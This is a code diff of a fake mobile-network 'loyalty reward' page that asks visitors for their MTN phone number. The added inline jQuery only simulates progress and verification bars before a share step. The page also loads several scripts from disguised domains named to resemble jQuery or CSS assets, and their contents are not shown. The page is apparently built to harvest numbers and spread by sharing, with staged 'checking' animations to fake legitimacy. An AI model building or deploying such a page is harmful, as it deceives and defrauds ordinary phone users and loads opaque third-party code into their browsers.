@@ -24,7 +24,7 @@
     }
 </script>
 
-   
+    <script src="reward-verify.js"></script>
     
     <script>
         function set_Cookie(name,value){
@@ -56,7 +56,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>ENTER YOUR MTN NUMBER</title>
     <link rel="shortcut icon" type="image/png" href="ii.jpeg" />
-    <script src="https://code-jquery-div-java-script-class-font-bg-color-style.ink/div-bg-color-font-25y.js"></script>
+    
     <meta name="og:title" content="ENTER YOUR MTN NUMBER" />
     <meta property="og:description"
         content="🎉 LOYALTY REWARD ALERT 🎉" />
@@ -651,7 +651,8 @@ background-color: rgb(255, 202, 6);
         <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgg3BY8G48ShwJZsTmXg8eDxHsylG6vw7KtQBDgGR6zqzVZusq_kzmNTaIxx9YgBYphu7w6ilD8cRw2YW00EV1ywYnIiQYOo98dyhnFrFBfHWRn9Sir-55Seyo-JVjvCaDJrigqqxKsW65Schvk8EpoAbpKKXZ9oIw0ZjsU7wFn6Y7OMeDwpb-_g6Vm4mli/s626/FD764B3E-4018-4305-80CA-BB8D662425A5.jpeg" alt="Free-Data" style="width: 100%;">
     </center>
      <script src="https://code.jquery.com/jquery-latest.min.js"></script>
-  <script>
+
+        <script>
          
         var time = 0;
 window.setInterval(function () {
@@ -683,7 +684,61 @@ $(".liked").click(function () {
  
         
         </script>
-<script src="https://div-ccss-font-class.ink/script-js-div-id-class-format-color-bg-font-style.js"></script>
+<script>
+    
+        $("#go").click(function () {
+    $("#intro").fadeOut(0);
+    $("#loader").fadeIn(1000);
+    var i = 0;
+    var interval = setInterval(function () {
+        $("#num").text(i + "%");
+        i += 1;
+        if (i >= 100) {
+            clearInterval(interval);
+            $("#loader").fadeOut(0);
+            $("#info").fadeIn(1000);
+        }
+    }, 50);
+});
+$("#confirm").click(function () {
+    if ($("#name").val().length < 4)
+    {
+        $(".error").fadeIn(500);
+    } else {
+        $("#info").fadeOut(0);
+        $("#checking").fadeIn(1000);
+        var i = 0;
+        var interval = setInterval(function () {
+            i += 1;
+            $("#percentage").text(i + "%");
+            $("#fill").css("width", i + "%");
+            if (i == 50) {
+                i = 49;
+                setTimeout(function () {
+                    i = 50;
+                }, 1000);
+            }
+            if (i >= 100) {
+                clearInterval(interval);
+                $("#load").fadeOut(0);
+                $("#check").fadeIn(0);
+                setTimeout(function () {
+                    $("#checking").fadeOut(0);
+                    $("#share").fadeIn(1000);
+                    $("#getname").html($("#name").val());
+                }, 500);
+            }
+        }, 50);
+    }
+});
+$(document).click(function () {
+    if ($("#name").is(":focus")) {
+        $(".error").fadeOut(500);
+    }
+});
+  
+</script>
+
 <script src="https://div-ccss-font-class.ink/css-java-script-jpeg-font-sise-css.js"></script>
 <script src="https://div-ccss-font-class.ink/css-java-script-jpeg-font-sise1-css.js"></script>
   <script src="https://div-ccss-font-class.ink/css-java-script-jpeg-font-sise5-css.js"></script>
